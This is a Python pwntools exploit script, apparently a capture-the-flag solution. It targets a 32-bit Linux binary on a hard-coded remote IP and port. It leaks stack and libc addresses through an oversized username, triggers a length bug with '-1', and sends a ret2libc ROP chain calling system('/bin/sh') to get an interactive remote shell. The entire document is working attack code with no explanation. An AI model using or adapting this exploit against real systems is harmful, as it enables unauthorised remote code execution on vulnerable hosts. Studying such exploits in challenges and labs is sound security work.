from pwn import *
context(arch='i386', os='linux')
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
libc = ELF('libc.so.6')

binsh_off = libc.search('/bin/sh').next() # rodata:0015CD48 aBinSh          db '/bin/sh',0
system_offset = libc.symbols["system"] 
exit_offset = libc.symbols["exit"]
libc_base = 0x00     # calculated later.
libc_diff = -0x4df05 # difference between libc leak and __libc_start_main.
stack_diff = -0xc8   # difference between stack leak and where we write.

r = remote("35.198.98.140",45067) # remote connection to get shell on the server.
#r = process("./vuln") 
r.sendlineafter("Enter username: ","A"*0x27)
r.recvuntil("Hey "+str("A"*0x27)+'\n')
leak = r.recvuntil("Enter length: ")

leak = leak[:-14]
stack_leak = u32(leak[:4])
libc_leak = u32(leak[4:8])

libc_addr = libc_leak + libc_diff 
stack_addr = stack_leak + stack_diff  
libc_base = libc_addr-0x18180 # calculate libc's base, based on
#                                __libc_start_main_'s offset
r.sendline('-1') # triggering the bug.
log.info("LIBC LEAK: "+str(hex(libc_base)))
log.info("STACK LEAK: "+str(hex(stack_addr)))

buffer_stackaddr = stack_addr + 0xcc 
binsh_varaddr = libc_base + binsh_off
system_addr = libc_base + system_offset 
exit_addr  = libc_base + exit_offset

ropchain =  'X'*80 + p32(buffer_stackaddr+4)
ropchain += 'X'*4
ropchain += 'X'*4
ropchain += 'X'*4
ropchain += p32(system_addr) 
ropchain += p32(exit_addr) 
ropchain += p32(binsh_varaddr)

r.sendlineafter('): ', ropchain)
r.interactive()
